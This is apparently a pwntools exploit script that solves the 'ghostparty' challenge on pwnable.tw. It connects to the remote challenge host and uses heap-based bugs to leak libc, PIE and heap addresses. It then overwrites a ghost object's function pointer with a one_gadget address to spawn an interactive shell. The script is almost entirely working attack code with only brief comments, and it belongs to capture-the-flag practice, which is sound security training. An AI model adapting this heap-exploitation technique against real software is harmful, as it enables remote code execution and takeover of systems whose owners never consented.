from pwn import *

#r = process('./ghostparty', env={'LD_PRELOAD': './libc.so.6'})
r = remote('chall.pwnable.tw', 10401)
has_attr = ['2' ,'7']

join = '1'
give_up = '2'
join_hear = '3'

def add_ghost(name, age, msg, tp, act, attr=None, stop=False):
    r.sendlineafter(':', '1')
    r.sendlineafter(':', name)
    r.sendlineafter(':', age)
    r.sendlineafter(':', msg)
    r.sendlineafter(':', tp)
    if tp in has_attr:
        r.sendlineafter(':', attr)

    r.sendlineafter(':', act)

def rm_ghost(idx):
    r.sendlineafter(':', '4')
    r.sendlineafter('party :', str(idx))

main_arena_offset = 0x3c3b20
one_gadget_offset = 0xef6c4

# leak libc
add_ghost('leak', '55', '55', '7', join_hear, '5'*0x80)
add_ghost('leak2', '55', '55', '7', join, '')
r.sendlineafter(':', '2')
r.sendlineafter('party :', '1')
r.recvuntil('Blood : ')
libc = u64(r.recvn(6).ljust(8, '\x00'))-88-main_arena_offset
log.info('libc: '+hex(libc))

# leak PIE
add_ghost('useless', '55', '55', '7', join, 'a'*0x10)

add_ghost('useless', '55', '55', '7', join, 'b') #3
r.sendlineafter(':', '2')
r.sendlineafter(':', '0')
r.recvuntil('Blood : ')
PIE = u64(r.recvn(6).ljust(8,'\x00')) - 0x2109d8
log.info('PIE: %x' % PIE)

# leak heap
add_ghost('leakHeap', '55', '55', '7', join_hear, 'g'*0x20)
r.sendlineafter(':', '2')
r.sendlineafter(':', '4')
r.recvuntil('Blood : ')
heap = u64(r.recvn(6).ljust(8,'\x00')) - 0xe90
log.info('Heap: %x' % heap)

# overwirte ghost->showinfo
add_ghost('leakHeap', '55', '55', '7', join_hear, 'g'*0x20)
add_ghost('useless', '55', '55', '7', join, 'b'*0x20)
add_ghost('useless', '55', '55', '7', join, 'b'*0x20)
add_ghost('useless', '55', '55', '7', join, 'b'*0x20)
rm_ghost(0)
rm_ghost(3)
add_ghost('hijack', '55', '55', '7', join, (p64(heap+0xee8) + p64(heap+0xee8) + p64(heap+0xda0)*2 + p64(7)+  p64(libc+one_gadget_offset)).ljust(0x60,'z'))


# goto shell
r.sendlineafter(':','2')
r.sendlineafter(':','2')

r.interactive()
